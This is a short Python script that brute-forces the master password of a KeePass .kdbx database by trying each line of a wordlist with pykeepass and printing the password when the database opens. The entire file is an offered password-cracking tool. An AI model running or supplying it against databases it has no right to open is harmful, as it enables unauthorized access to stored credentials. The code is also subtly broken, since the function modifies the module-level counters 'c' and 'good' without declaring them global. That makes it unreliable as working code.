'''
 ============================================================================
 Script to launch a brute force attack on a kdbx file
 
 Limits:
 Execution stops after a certain number of iterations
 Possible reasons:
 - RAM overloaded
 - Keepass security
 ============================================================================
'''
from pykeepass import PyKeePass


c = 1 # counter of tries
good = None # loop invariant
n = 0 # starting line if you can not run everything at once

def crack_kdbx(abs_path:str, words_list:str):
    """Run a bruteforce attack on a kdbx file """
    with open(f"words_list/{words_list}.txt", "r") as f:
        for i, line in enumerate(f):
            if i < n:  # allow the user to start from a certain line
                continue
            pswd = line.strip()
            c += 1
            if good is None:
                try:
                    with PyKeePass(abs_path, pswd):
                        print(f"\033[92m[*] Password: {pswd} found after {c} tries")
                        good = pswd
                except:
                    print(f"\033[91m[{c}] {pswd}")
            else:
                break  # exit the loop if the password has been found